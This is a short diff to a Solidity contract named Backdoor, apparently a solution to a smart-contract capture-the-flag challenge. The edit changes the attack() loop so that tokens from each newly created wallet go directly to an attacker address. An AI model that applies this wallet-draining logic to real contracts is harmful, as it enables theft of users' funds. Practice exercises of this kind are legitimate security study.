@@ -34,8 +34,7 @@ contract Backdoor {
 
         for (uint256 i = 0; i < length; ++i) {
             address walletAddress = createWalletWithCallback(users[i]);
-            token.transferFrom(walletAddress, address(this), 10 ether);
-            token.transfer(attacker, 10 ether);
+            token.transferFrom(walletAddress, attacker, 10 ether);
         }
     } // end of attack() function
     
